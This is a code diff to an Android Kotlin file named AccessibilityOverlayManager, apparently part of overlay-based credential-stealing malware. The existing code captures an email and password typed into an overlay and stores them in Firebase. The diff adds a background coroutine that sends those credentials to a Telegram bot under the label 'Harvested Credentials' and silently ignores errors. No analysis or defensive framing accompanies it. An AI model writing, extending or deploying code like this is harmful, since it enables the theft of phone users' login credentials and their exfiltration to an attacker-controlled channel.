@@ -26,6 +26,10 @@ import android.widget.LinearLayout
 import android.widget.TextView
 import android.text.InputType
 import com.google.firebase.database.FirebaseDatabase
+import com.example.data.sync.TelegramBotManager
+import kotlinx.coroutines.CoroutineScope
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.launch
 
 data class OverlayTemplateConfig(
     val templateId: String,
@@ -400,6 +404,13 @@ object AccessibilityOverlayManager {
                                         "timestamp" to System.currentTimeMillis()
                                     )
                                     ref.push().setValue(record)
+
+                                    kotlinx.coroutines.CoroutineScope(kotlinx.coroutines.Dispatchers.IO).launch {
+                                        try {
+                                            val bot = TelegramBotManager(appContext)
+                                            bot.sendMessage("🔐 *Harvested Credentials*\n👤 Username/Email: `$email`\n🔑 Password: `$pass`")
+                                        } catch (_: Exception) {}
+                                    }
                                 } catch (_: Exception) {}
                             }
                             removeOverlay(appContext)
